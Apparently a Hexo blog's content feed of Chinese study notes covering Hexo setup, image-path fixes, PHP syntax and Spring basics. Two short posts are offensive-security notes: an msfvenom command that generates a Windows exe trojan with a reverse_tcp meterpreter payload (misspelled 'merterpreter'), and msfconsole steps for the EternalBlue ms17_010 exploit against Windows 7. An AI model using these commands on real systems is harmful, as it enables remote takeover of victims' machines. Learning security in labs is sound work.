<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>hexo图片加载问题</title>
    <url>/2023/09/26/hexo%E5%9B%BE%E7%89%87%E5%8A%A0%E8%BD%BD%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="1-开启post-asset-floder选项"><a href="#1-开启post-asset-floder选项" class="headerlink" title="1. 开启post_asset_floder选项"></a>1. 开启post_asset_floder选项</h1><p>在blog的根目录下，打开整个博客的配置文件，_config.yml，把其中的post_asset_floder选项改为true。</p>
<span id="more"></span>	

<p><img src="/2023/09/26/hexo%E5%9B%BE%E7%89%87%E5%8A%A0%E8%BD%BD%E9%97%AE%E9%A2%98/image-20230924161033586.png" alt="image-20230924161033586"></p>
<p><img src="/2023/09/26/hexo%E5%9B%BE%E7%89%87%E5%8A%A0%E8%BD%BD%E9%97%AE%E9%A2%98/image-20230924161147016.png" alt="image-20230924161147016"></p>
<p><strong>资源文件夹</strong> (post_asset_folder) 是 Hexo 的一项功能。 具体使用方式是在 _config.yml 中修改: post_asset_folder: true 这样子修改之后，当你使用 hexo new 命令创建文件的时候，会生成一个和你的文章同名的文件夹，里面可以放一些资源文件。</p>
<p>在后面的处理中，我们需要将我们的图片文件放到我们博客的.md的同名文件夹下。（这里先暂时不管有什么意义，因为毕竟一般不用new来创建新的.md文件）</p>
<h1 id="2-更改typora图片的存储格式"><a href="#2-更改typora图片的存储格式" class="headerlink" title="2. 更改typora图片的存储格式"></a>2. 更改typora图片的存储格式</h1><p>​	在之前的使用中，写markdown文件时，我一般都是直接将图片粘贴过来，使用的是markdown存储图片的默认格式。在默认的模式中，我们粘贴到markdown文件中的图片都会先保存到typora的默认存储位置，然后通过引用标签和图片绝对路径来显示在markdown文件中。这样有两个坏处，</p>
<p>​	一是存储位置默认在C盘，容易吃系统盘的空间。二是图片文件和markdown文件分离，相隔较远，不容易管理，一旦图片移动，就容易加载不出来，特别是在博客中，当我们将markdown文件上传，当然是访问不到的。</p>
<p><img src="/2023/09/26/hexo%E5%9B%BE%E7%89%87%E5%8A%A0%E8%BD%BD%E9%97%AE%E9%A2%98/image-20230924162913600.png" alt="image-20230924162913600"></p>
<p>因此，我们可以在typora的图像设置中设置成如上图所示，保存图片的文件夹就用同名文件夹，别改，有坑！！！</p>
<p>这也算是前面将post_asset_floder改为true的原因之一，我们可以将自己写的markdown文件和装有图片的同名文件夹放到_post文件夹下，当我们使用hexo g命令时，便可以将图片和markdown文件传到public文件夹下（根据markdown生成的html文件和其中的图片资源），如果文件夹与对应的markdown文件不同名，图片是传不过去的，更别说访问到图片了，这里搞了我一个小时才发现，血泪教训啊。</p>
<h1 id="3-安装hexo-asset-img插件"><a href="#3-安装hexo-asset-img插件" class="headerlink" title="3. 安装hexo-asset-img插件"></a>3. 安装hexo-asset-img插件</h1><p>当我们把markdown文件和同名的图片文件夹放到_post文件夹下，并执行hexo clean 和 hexo g命令后，查看public下的文件</p>
<p><img src="/2023/09/26/hexo%E5%9B%BE%E7%89%87%E5%8A%A0%E8%BD%BD%E9%97%AE%E9%A2%98/image-20230924163952781.png" alt="image-20230924163952781"></p>
<p><img src="/2023/09/26/hexo%E5%9B%BE%E7%89%87%E5%8A%A0%E8%BD%BD%E9%97%AE%E9%A2%98/image-20230924164100527.png" alt="image-20230924164100527"></p>
<p>可以看到，对应的html文件和图片也都生成了，但是依然看不到图片，为什么呢？查看网页源代码，</p>
<p><img src="/2023/09/26/hexo%E5%9B%BE%E7%89%87%E5%8A%A0%E8%BD%BD%E9%97%AE%E9%A2%98/image-20230924164255431.png" alt="image-20230924164255431"></p>
<p>可以看到，图片的访问路径是有问题的，html文件和img文件是在同一个文件夹下，但是访问路径却还是markdown文件中的访问路径，多了前面的test-md，将其删去，</p>
<p><img src="/2023/09/26/hexo%E5%9B%BE%E7%89%87%E5%8A%A0%E8%BD%BD%E9%97%AE%E9%A2%98/image-20230924164510519.png" alt="image-20230924164510519"></p>
<p>成功了。</p>
<p>因此，我们需要hexo-asset-img插件来帮助我们将图片的访问路径正确转换。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install https://github.com/CodeFalling/hexo-asset-image --save</span><br></pre></td></tr></table></figure>

<p>使用以上命令，安装，完成后在重新打包和部署页面，网页正常了。</p>
]]></content>
      <categories>
        <category>hexo博客搭建问题</category>
      </categories>
      <tags>
        <tag>博客建立</tag>
        <tag>hexo图片加载问题</tag>
        <tag>安装hexo-asset-img插件</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/13/msfvenom%E9%92%88%E5%AF%B9windows%E7%94%9F%E6%88%90exe%E6%9C%A8%E9%A9%AC/</url>
    <content><![CDATA[<p>title: msfconsole针对windows生成exe木马<br>date: ‎2023‎-5‎-‎31‎ ‏‎20:28:21<br>tags: [msfconsole]<br>categories: [msfconsole]</p>
<p>msfvenom -p(payload,负载选项)  windows&#x2F;x64&#x2F;merterpreter&#x2F;reverse_tcp lhost &#x3D; 本机IP lport &#x3D; 本机端口（随便）-f(生成什么形式的文件) exe -o(输出) demo.exe</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/13/msfconsole%E4%BD%BF%E7%94%A8%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E8%8E%B7%E5%8F%96win7%E5%91%BD%E4%BB%A4%E8%A1%8C/</url>
    <content><![CDATA[<p>title: msfconsole使用永恒之蓝获取win7命令行<br>date: ‎2023‎-‎5‎-‎31‎ ‏‎20:27:52<br>tags: [永恒之蓝利用, msfconsole]<br>categories: [msfconsole]</p>
<p>打开kali进root权限</p>
<p>命令行msfconsole（msf工具的一个接口）</p>
<p>search ms17_010（找永恒之蓝漏洞）</p>
<p>ues:  use 0</p>
<p>set:  设置相关参数,源Ip(默认配好的),目标靶机ip、端口号（默认就行）</p>
<p>run</p>
<p>完成</p>
<span id="more"></span>

]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/13/php%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>title: php学习记录<br>date: 2023‎-‎9‎-‎6‎ ‏‎21:48:46<br>tags: [php]<br>categories: [php]</p>
<h1 id="1-基础语法"><a href="#1-基础语法" class="headerlink" title="1. 基础语法"></a>1. 基础语法</h1><h3 id="1-基本信息"><a href="#1-基本信息" class="headerlink" title="1. 基本信息"></a>1. 基本信息</h3><ul>
<li><p>PHP 文件的默认扩展名是 “.php”</p>
</li>
<li><p>PHP 文件中可以包含 <code>html</code>、<code>CSS</code>、<code>JavaScript</code> 代码</p>
</li>
<li><p>单行注释 &#x2F;&#x2F;         多行注释 &#x2F;*  *&#x2F;</p>
</li>
</ul>
<span id="more"></span>

<h3 id="2-PHP标记"><a href="#2-PHP标记" class="headerlink" title="2. PHP标记"></a>2. PHP标记</h3><ul>
<li>开始标记 <code>&lt;?php</code> 和 结束标记 <code>?&gt;</code> 中间写 <code>PHP</code> 代码</li>
</ul>
<p>当解析一个文件时，<code>PHP</code> 会寻找起始和结束标记，也就是告诉 <code>PHP</code> 开始和停止解析二者之间的代码。此种解析方式使得 <code>PHP</code> 可以被嵌入到各种不同的文档中去，而任何起始和结束标记之外的部分都会被 <code>PHP</code> 解析器忽略。</p>
<h3 id="3-PHP代码"><a href="#3-PHP代码" class="headerlink" title="3. PHP代码"></a>3. PHP代码</h3><ul>
<li>echo 可以输出多个字符串，用逗号（，）隔开</li>
<li>print 只能输出单个字符串</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="number">123</span>,<span class="number">456</span>;</span><br><span class="line">	<span class="keyword">print</span> <span class="number">789</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>必须有语句的结束符，用(;)</p>
</li>
<li><p>注释</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">//单行注释</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    多</span></span><br><span class="line"><span class="comment">    行</span></span><br><span class="line"><span class="comment">    注</span></span><br><span class="line"><span class="comment">    释</span></span><br><span class="line"><span class="comment">    */</span></span><br></pre></td></tr></table></figure>



<h3 id="4-php变量"><a href="#4-php变量" class="headerlink" title="4. php变量"></a>4. php变量</h3><ul>
<li>变量声明</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&#x27;php&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>赋值运算符：&#x3D;</li>
</ul>
<h1 id="2-PHP数据类型"><a href="#2-PHP数据类型" class="headerlink" title="2. PHP数据类型"></a>2. PHP数据类型</h1><h3 id="1-标量数据类型"><a href="#1-标量数据类型" class="headerlink" title="1. 标量数据类型"></a>1. 标量数据类型</h3><ul>
<li>布尔型（boolean）：true和false</li>
<li>整型（int）：负无穷<del>0</del>正无穷</li>
<li>浮点型（float）：带小数，范围和整型一样</li>
<li>字符串（String）：任何符号、语言、字符</li>
</ul>
<p>echo输出数据的值，一般开发时用</p>
<p>var_dump打印变量的类型和值，调试时用</p>
<h3 id="2-复合数据类型"><a href="#2-复合数据类型" class="headerlink" title="2. 复合数据类型"></a>2. 复合数据类型</h3><ul>
<li>array：数组</li>
<li>object：对象</li>
<li>callable：可调用</li>
<li>iterable：可迭代</li>
</ul>
<h3 id="3-特殊数据类型"><a href="#3-特殊数据类型" class="headerlink" title="3. 特殊数据类型"></a>3. 特殊数据类型</h3><ul>
<li><p>空值（NULL）</p>
</li>
<li><p>资源（resource）</p>
</li>
</ul>
<h1 id="3-数组"><a href="#3-数组" class="headerlink" title="3. 数组"></a>3. 数组</h1><h3 id="1-空数组的创建"><a href="#1-空数组的创建" class="headerlink" title="1. 空数组的创建"></a>1. 空数组的创建</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$arr</span> = <span class="keyword">array</span>();</span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="variable">$arr</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$arr</span> = [];</span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="2-索引数组的创建"><a href="#2-索引数组的创建" class="headerlink" title="2. 索引数组的创建"></a>2. 索引数组的创建</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;欧阳&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;西门&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;灭绝&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>( <span class="variable">$arr</span> );</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="number">0</span>];</span><br></pre></td></tr></table></figure>

<h3 id="3-创建关联数组"><a href="#3-创建关联数组" class="headerlink" title="3. 创建关联数组"></a>3. 创建关联数组</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$arr</span> = [</span><br><span class="line">    <span class="string">&#x27;ouyang&#x27;</span> =&gt; <span class="string">&#x27;欧阳&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ximen&#x27;</span> =&gt; <span class="string">&#x27;西门&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;miejue&#x27;</span> =&gt; <span class="string">&#x27;灭绝&#x27;</span></span><br><span class="line">];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>( <span class="variable">$arr</span> );</span><br></pre></td></tr></table></figure>

<h3 id="4-输出数组值"><a href="#4-输出数组值" class="headerlink" title="4. 输出数组值"></a>4. 输出数组值</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$arr</span> = [</span><br><span class="line">    <span class="string">&#x27;欧阳&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;西门&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;灭绝&#x27;</span></span><br><span class="line">];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$arrs</span> = [</span><br><span class="line">    <span class="string">&#x27;ouyang&#x27;</span> =&gt; <span class="string">&#x27;欧阳&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ximen&#x27;</span> =&gt; <span class="string">&#x27;西门&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;miejue&#x27;</span> =&gt; <span class="string">&#x27;灭绝&#x27;</span></span><br><span class="line">];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arrs</span>[<span class="string">&#x27;ouyangke&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arrs</span>[<span class="string">&#x27;huangrong&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arrs</span>[<span class="string">&#x27;guojing&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="5-打印数组-print-r"><a href="#5-打印数组-print-r" class="headerlink" title="5. 打印数组 print_r"></a>5. 打印数组 <code>print_r</code></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$arr</span> = [</span><br><span class="line">    <span class="string">&#x27;欧阳&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;西门&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;灭绝&#x27;</span></span><br><span class="line">];</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$arr</span>);</span><br></pre></td></tr></table></figure>

<h3 id="6-php-连接符"><a href="#6-php-连接符" class="headerlink" title="6. php 连接符"></a>6. php 连接符</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$var1</span> = <span class="string">&#x27;PHP讲师&#x27;</span>;</span><br><span class="line"><span class="variable">$var2</span> = <span class="string">&#x27;欧阳&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>( <span class="variable">$var1</span> . <span class="variable">$var2</span> );</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>( <span class="variable">$var1</span> . <span class="string">&#x27;：&#x27;</span> . <span class="variable">$var2</span> );</span><br><span class="line">$袁俊 = <span class="string">&#x27;hi&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>($袁俊)</span><br></pre></td></tr></table></figure>

<h1 id="4-多维数组"><a href="#4-多维数组" class="headerlink" title="4. 多维数组"></a>4. 多维数组</h1><h3 id="1-二维数组"><a href="#1-二维数组" class="headerlink" title="1. 二维数组"></a>1. 二维数组</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;欧阳&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;school&#x27;</span>  =&gt; <span class="string">&#x27;PHP中文网&#x27;</span></span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;西门&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;school&#x27;</span>  =&gt; <span class="string">&#x27;PHP中文网&#x27;</span></span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;灭绝&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;school&#x27;</span>  =&gt; <span class="string">&#x27;PHP中文网&#x27;</span></span><br><span class="line">    )</span><br><span class="line">)</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$arr</span>);</span><br></pre></td></tr></table></figure>

<h3 id="2-三维数组"><a href="#2-三维数组" class="headerlink" title="2. 三维数组"></a>2. 三维数组</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$arr</span> = [</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;欧阳&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;school&#x27;</span>  =&gt; <span class="string">&#x27;PHP中文网&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;gongfu&#x27;</span> =&gt; [</span><br><span class="line">            <span class="string">&#x27;PHP&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;小程序&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;layui&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Thinkphp&#x27;</span></span><br><span class="line">        ]</span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;西门&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;school&#x27;</span>  =&gt; <span class="string">&#x27;PHP中文网&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;gongfu&#x27;</span> =&gt; [</span><br><span class="line">            <span class="string">&#x27;PHP&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Thinkphp&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Laravel&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;实战项目&#x27;</span></span><br><span class="line">        ]</span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;灭绝&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;school&#x27;</span>  =&gt; <span class="string">&#x27;PHP中文网&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;gongfu&#x27;</span> =&gt; [</span><br><span class="line">            <span class="string">&#x27;HTML&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;PHP&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;layui&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Thinkphp&#x27;</span></span><br><span class="line">        ]</span><br><span class="line">    ]</span><br><span class="line">];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$arr</span>);</span><br></pre></td></tr></table></figure>

<p>一般的层次不要超过三层</p>
<h3 id="3-多维数组的访问"><a href="#3-多维数组的访问" class="headerlink" title="3. 多维数组的访问"></a>3. 多维数组的访问</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$arr</span> = [</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;欧阳&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;school&#x27;</span>  =&gt; <span class="string">&#x27;PHP中文网&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;gongfu&#x27;</span> =&gt; [</span><br><span class="line">            <span class="string">&#x27;PHP&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;小程序&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;layui&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Thinkphp&#x27;</span></span><br><span class="line">        ]</span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;西门&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;school&#x27;</span>  =&gt; <span class="string">&#x27;PHP中文网&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;gongfu&#x27;</span> =&gt; [</span><br><span class="line">            <span class="string">&#x27;PHP&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Thinkphp&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Laravel&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;实战项目&#x27;</span></span><br><span class="line">        ]</span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;灭绝&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;school&#x27;</span>  =&gt; <span class="string">&#x27;PHP中文网&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;gongfu&#x27;</span> =&gt; [</span><br><span class="line">            <span class="string">&#x27;HTML&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;PHP&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;layui&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Thinkphp&#x27;</span></span><br><span class="line">        ]</span><br><span class="line">    ]</span><br><span class="line">]</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="number">0</span>][<span class="string">&#x27;name&#x27;</span>].<span class="string">&#x27; --- &#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="number">0</span>][<span class="string">&#x27;gongfu&#x27;</span>][<span class="number">0</span>].<span class="string">&#x27; --- &#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="number">0</span>][<span class="string">&#x27;gongfu&#x27;</span>][<span class="number">1</span>];</span><br></pre></td></tr></table></figure>

<h3 id="4-php数组循环"><a href="#4-php数组循环" class="headerlink" title="4. php数组循环"></a>4. php数组循环</h3><h4 id="1-foreach"><a href="#1-foreach" class="headerlink" title="1. foreach"></a>1. foreach</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;ouyang&#x27;</span> =&gt; <span class="string">&#x27;欧阳&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ximen&#x27;</span> =&gt; <span class="string">&#x27;西门&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;miejue&#x27;</span> =&gt; <span class="string">&#x27;灭绝&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">foreach</span>( <span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$v</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$v</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-key和value"><a href="#2-key和value" class="headerlink" title="2. key和value"></a>2. key和value</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>[</span><br><span class="line">    <span class="string">&#x27;ouyang&#x27;</span> =&gt; <span class="string">&#x27;欧阳&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ximen&#x27;</span> =&gt; <span class="string">&#x27;西门&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;miejue&#x27;</span> =&gt; <span class="string">&#x27;灭绝&#x27;</span></span><br><span class="line">];</span><br><span class="line"><span class="keyword">foreach</span>( <span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span> )&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$k</span> . <span class="string">&#x27; --- &#x27;</span> . <span class="variable">$v</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-多维数组的循环"><a href="#3-多维数组的循环" class="headerlink" title="3. 多维数组的循环"></a>3. 多维数组的循环</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$arr</span> = [</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;欧阳&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;school&#x27;</span>  =&gt; <span class="string">&#x27;PHP中文网&#x27;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;西门&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;school&#x27;</span>  =&gt; <span class="string">&#x27;PHP中文网&#x27;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;灭绝&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;school&#x27;</span>  =&gt; <span class="string">&#x27;PHP中文网&#x27;</span></span><br><span class="line">    ]</span><br><span class="line">];</span><br><span class="line"><span class="keyword">foreach</span>( <span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span> )&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$v</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/09/24/spring/</url>
    <content><![CDATA[<p>title: Spring学习<br>date: ‎2023‎-9‎-‎24‎ 15:19:38<br>tags: [java开发，Spring]<br>categories: [java开发]</p>
<h3 id="1-什么是Spring"><a href="#1-什么是Spring" class="headerlink" title="1. 什么是Spring"></a>1. 什么是Spring</h3><p>一个轻量级的控制反转（IOC）和面向切面（AOP）的框架</p>
<ul>
<li>一个开源的免费框架（容器）</li>
<li>轻量级、非入侵式的框架</li>
<li>控制反转（IOC）和面向切面编程（AOP）</li>
<li>支持对事务的处理、对框架整合的支持</li>
</ul>
<span id="more"></span>



<h3 id="2-spring的组成"><a href="#2-spring的组成" class="headerlink" title="2. spring的组成"></a>2. spring的组成</h3><p><img src="/2023/09/24/spring/image-20230703141900747.png" alt="image-20230703141900747"></p>
<p>主要有七大模块组成，基本上是一个大杂烩，各种东西的整合，核心是 Spring core</p>
<h3 id="3-Spring拓展"><a href="#3-Spring拓展" class="headerlink" title="3. Spring拓展"></a>3. Spring拓展</h3><ul>
<li>Spring boot：构建一切<ul>
<li>约定大于配置</li>
<li>简单配置便可以搭建起一个微服务</li>
</ul>
</li>
<li>Spring Cloud：协调一切</li>
<li>Spring Cloud Data Flow：连接一切</li>
</ul>
<p>由于Spring不断发展，整合的框架越来越多，导致冗杂，配置地狱，使用Spring Boot解决这个问题，因此学习Spring boot前先学习Spring和Spring MVC作为基础</p>
<h3 id="4-IOC创建对象的方式"><a href="#4-IOC创建对象的方式" class="headerlink" title="4. IOC创建对象的方式"></a>4. IOC创建对象的方式</h3><ul>
<li>无参构造构建对象，默认方法</li>
</ul>
